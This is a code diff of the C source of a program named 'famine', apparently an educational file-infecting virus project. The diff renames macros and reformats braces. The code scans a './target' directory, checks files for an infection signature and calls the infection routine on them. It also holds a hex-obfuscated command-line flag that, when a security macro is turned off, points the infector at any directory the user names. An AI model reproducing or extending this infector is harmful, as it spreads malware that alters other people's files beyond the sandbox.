@@ -8,10 +8,10 @@
 #include <sys/stat.h>
 
 
-#define _TARGET "./target"
+#define FM_TARGET "./target"
 
-#ifndef _SECURITY
-# define _SECURITY 1
+#ifndef FM_SECURITY
+# define FM_SECURITY 1
 #endif
 
 void famine(struct dirent *d, char *path){
@@ -46,7 +46,8 @@ void famine(struct dirent *d, char *path){
 			return ;
 		for(size_t i = 0; i < sizeof(signature); i++)
 		{
-			if ((signature[i] == buf2[i] && i == sizeof(signature) - 2)){
+			if ((signature[i] == buf2[i] && i == sizeof(signature) - 2))
+			{
 				close(fd);
 				return ;
 			}
@@ -66,40 +67,42 @@ void famine(struct dirent *d, char *path){
 		close(fd);
 }
 
-int main(int argc, char **argv){
-		DIR *dir;
-		dir = opendir(_TARGET);
-		if (dir && argc == 1)
-		{
-			for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
-				famine(d, _TARGET);
-		}
-		else if (_SECURITY == 0 && argv[1] && strlen(argv[1]) > 2 && argv[1][0] == '-' && argv[1][1] == '-')
-		{
-			if (!strcmp(argv[1], "\x2D\x2D\x69\x6B\x6E\x6F\x77\x77\x68\x61\x74\x69\x61\x6D\x64\x6F\x69\x6E\x67"))
-				for (int i = 3; i < argc; i++)
-				{
-					for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
-					{
-						if (strcmp(d->d_name, argv[i]) == 0)
-							famine(d, argv[2]);
-					}
-					closedir(dir);
-					dir = opendir(argv[2]);
-				}
-		}
-		else{
-			for (int i = 1; i < argc; i++)
+int main(int argc, char **argv)
+{
+	DIR *dir;
+	dir = opendir(FM_TARGET);
+	if (dir && argc == 1)
+	{
+		for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
+			famine(d, FM_TARGET);
+	}
+	else if (FM_SECURITY == 0 && argv[1] && strlen(argv[1]) > 2 && argv[1][0] == '-' && argv[1][1] == '-')
+	{
+		if (!strcmp(argv[1], "\x2D\x2D\x69\x6B\x6E\x6F\x77\x77\x68\x61\x74\x69\x61\x6D\x64\x6F\x69\x6E\x67"))
+			for (int i = 3; i < argc; i++)
 			{
 				for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
 				{
 					if (strcmp(d->d_name, argv[i]) == 0)
-						famine(d, _TARGET);
+						famine(d, argv[2]);
 				}
 				closedir(dir);
-				dir = opendir(_TARGET);
+				dir = opendir(argv[2]);
 			}
+	}
+	else
+	{
+		for (int i = 1; i < argc; i++)
+		{
+			for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
+			{
+				if (strcmp(d->d_name, argv[i]) == 0)
+					famine(d, FM_TARGET);
+			}
+			closedir(dir);
+			dir = opendir(FM_TARGET);
 		}
+	}
 	closedir(dir);
 	return 0;
 }
